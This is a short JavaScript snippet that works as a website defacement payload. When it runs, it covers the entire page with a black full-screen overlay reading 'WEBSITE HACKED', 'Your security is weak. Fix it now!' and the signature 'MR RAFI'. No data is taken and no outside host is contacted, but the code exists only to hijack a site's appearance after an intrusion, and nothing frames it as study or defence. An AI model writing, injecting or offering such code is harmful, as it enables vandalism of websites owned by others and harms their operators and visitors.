(function(){
    const overlay = document.createElement('div');
    overlay.innerHTML = `
        <div style="
            position:fixed;
            top:0;
            left:0;
            width:100vw;
            height:100vh;
            background:black;
            color:#00ff00;
            display:flex;
            align-items:center;
            justify-content:center;
            flex-direction:column;
            z-index:999999999;
            font-family:'Courier New', monospace;">
            <div style="font-size:3em;color:red;text-shadow:0 0 15px red;">WEBSITE HACKED</div>
            <div style="margin-top:20px;font-size:1.5em;">Your security is weak. Fix it now!</div>
            <div style="margin-top:30px;font-size:2em;color:cyan;text-shadow:0 0 20px cyan;">MR RAFI</div>
        </div>
    `;
    document.body.appendChild(overlay);
})();
